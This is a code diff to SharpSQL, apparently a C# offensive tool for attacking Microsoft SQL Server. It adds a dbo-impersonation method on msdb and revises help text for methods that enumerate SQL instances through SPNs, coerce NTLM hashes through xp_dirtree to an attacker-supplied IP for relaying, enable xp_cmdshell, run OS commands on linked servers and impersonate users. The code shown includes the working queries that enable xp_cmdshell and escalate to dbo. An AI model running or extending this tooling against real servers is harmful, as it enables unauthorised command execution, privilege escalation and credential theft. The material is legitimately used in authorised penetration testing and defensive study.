@@ -28,34 +28,35 @@ Options:
     -LinkedInstance            - The linked instance to target
     -ip                        - The IP to xp_dirtree (share: /pwn)
     -User                      - The user to impersonate
-    -Command                   - The command to execute (default: whoami - Invoke-OSCmd and Invoke-LinkedOSCmd)
+    -Command                   - The command to execute (default: whoami - Invoke-OSCmd, Invoke-LinkedOSCmd, Invoke-ExternalScript, and Invoke-OLEObject)
     -Query                     - The raw SQL query to execute
-    -help                      - Show  help
+    -help                      - Show help
 
 Methods:
     Get-SQLInstanceDomain      - Get SQL instances within current domain via user and computer SPNs (no parameters required)
-    Get-Databases              - Get available databases (-Instance required)
-    Get-DBUser                 - Get database user via USER_NAME (-Instance required)
-    Get-GroupMembership        - Get group member for current user ('guest' or 'sysadmin') (-Instance required)
-    Get-Hash                   - Get hash via xp_dirtree (-Instance and -ip required)
-    Get-ImpersonableUsers      - Get impersonable users (-Instance required)
-    Get-LinkedServers          - Get linked SQL servers (-Instance required)
-    Get-LinkedPrivs            - Get current user privs for linked server (-Instance and -LinkedInstance required)
-    Get-Sysadmins              - Get sysadmin users (-Instance required)
-    Get-SystemUser             - Get system user via SYSTEM_USER (-Instance required)
-    Get-SQLQuery               - Execute raw SQL query (-Instance and -Query required)
-    Get-Triggers               - Get SQL server triggers (-Instance required)
-    Get-Users                  - Get users from syslogins (-Instance required)
-    Get-UserPrivs              - Get current user server privileges (-Instance required)
-    Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance (-Instance required)
-    Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server (-Instance and -LinkedInstance required)
-    Enable-Cmdshell            - Enable xp_cmdshell on instance (-Instance required)
-    Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server (-Instance and -LinkedInstance required)
-    Invoke-OSCmd               - Execute system command via_xp_cmdshell on instance (-Instance required)
-    Invoke-LinkedOSCmd         - Executes system command via xp_cmdshell on linked server (-Instance and -LinkedInstance required)
-    Invoke-ExternalScript      - Invoke external python script command execution (-Instance required)
-    Invoke-OLEObject           - Invoke OLE wscript command execution (-Instance required)
-    Invoke-UserImpersonation   - Impersonate user (-Instance and -User required)
+    Get-Databases              - Get available databases 
+    Get-DBUser                 - Get database user via USER_NAME
+    Get-GroupMembership        - Get group member for current user ('guest' or 'sysadmin')
+    Get-Hash                   - Get hash via xp_dirtree, works nicely with impacket-ntlmrelayx
+    Get-ImpersonableUsers      - Get impersonable users 
+    Get-LinkedServers          - Get linked SQL servers
+    Get-LinkedPrivs            - Get current user privs for linked server
+    Get-Sysadmins              - Get sysadmin users
+    Get-SystemUser             - Get system user via SYSTEM_USER
+    Get-SQLQuery               - Execute raw SQL query
+    Get-Triggers               - Get SQL server triggers
+    Get-Users                  - Get users from syslogins
+    Get-UserPrivs              - Get current user server privileges
+    Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance
+    Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server
+    Enable-Cmdshell            - Enable xp_cmdshell on instance
+    Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server
+    Invoke-OSCmd               - Execute system command via_xp_cmdshell on instance
+    Invoke-LinkedOSCmd         - Executes system command via xp_cmdshell on linked server
+    Invoke-ExternalScript      - Invoke external python script command execution 
+    Invoke-OLEObject           - Invoke OLE wscript command execution
+    Invoke-UserImpersonation   - Impersonate user and execute query
+    Invoke-DBOImpersonation    - Impersonate dbo on msdb and execute query
 
 Examples:
 
@@ -156,7 +157,6 @@ Examples:
         {
             string[] spns = { };
             List<string> list = new List<string>(spns.ToList());
-
             using (var context = new PrincipalContext(ContextType.Domain))
             {
                 using (var searcher = new PrincipalSearcher(new ComputerPrincipal(context)))
@@ -164,7 +164,6 @@ Examples:
                     foreach (var result in searcher.FindAll())
                     {
                         DirectoryEntry de = result.GetUnderlyingObject() as DirectoryEntry;
-
                         foreach (string spn in de.Properties["serviceprincipalname"])
                         {
                             Match cont = Regex.Match(spn, "MSSQL");
@@ -184,7 +183,6 @@ Examples:
                     foreach (var result in searcher.FindAll())
                     {
                         DirectoryEntry de = result.GetUnderlyingObject() as DirectoryEntry;
-
                         foreach (string spn in de.Properties["serviceprincipalname"])
                         {
                             Match cont = Regex.Match(spn, "MSSQL");
@@ -408,9 +406,8 @@ Examples:
             {
                 if (string.IsNullOrEmpty(Config.user) || (string.IsNullOrEmpty(Config.query)))
                 {
-                    Console.WriteLine("[!] No user supplied!");
-                    Console.WriteLine("[!] No query supplied!");
-                    Console.WriteLine("Usage: SharpSQL.exe Invoke-UserImpersonation -Instance sql.server -User sa");
+                    Console.WriteLine("[!] No user or query supplied!");
+                    Console.WriteLine("Usage: SharpSQL.exe Invoke-UserImpersonation -Instance sql.server -User sa -Query 'select user_name()'");
                     Environment.Exit(0);
                 }
 
@@ -424,11 +421,28 @@ Examples:
             }
 
 
+            else if (string.Equals(command, "Invoke-DBOImpersonation", StringComparison.CurrentCultureIgnoreCase))
+            {
+                if (string.IsNullOrEmpty(Config.query))
+                {
+                    Console.WriteLine("[!] No query supplied!");
+                    Console.WriteLine("Usage: SharpSQL.exe Invoke-DBOImpersonation -Instance sql.server -Query 'select user_name()'");
+                    Environment.Exit(0);
+                }
 
+                else
+                {
+                    string query = executeQuery($"use msdb; EXECUTE AS USER = 'dbo';", con);
+                    query = executeQuery($"{Config.query};", con);
+                    Console.WriteLine("[*] Invoke-DBOImpersonation: ");
+                    Console.WriteLine($"{query}");
+                }
+            }
 
 
             /////////////////////////////////////////////////////////////////////////////////////////////////////
             // Code Execution
+
             else if (string.Equals(command, "Enable-Cmdshell", StringComparison.CurrentCultureIgnoreCase))
             {
                 string query = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
@@ -467,7 +481,7 @@ Examples:
             {
                 if (string.IsNullOrEmpty(Config.ip))
                 {
-                    Console.WriteLine("[!] No share supplied!");
+                    Console.WriteLine("[!] No ip supplied!");
                     Console.WriteLine("Usage: SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10");
                     Environment.Exit(0);
                 }
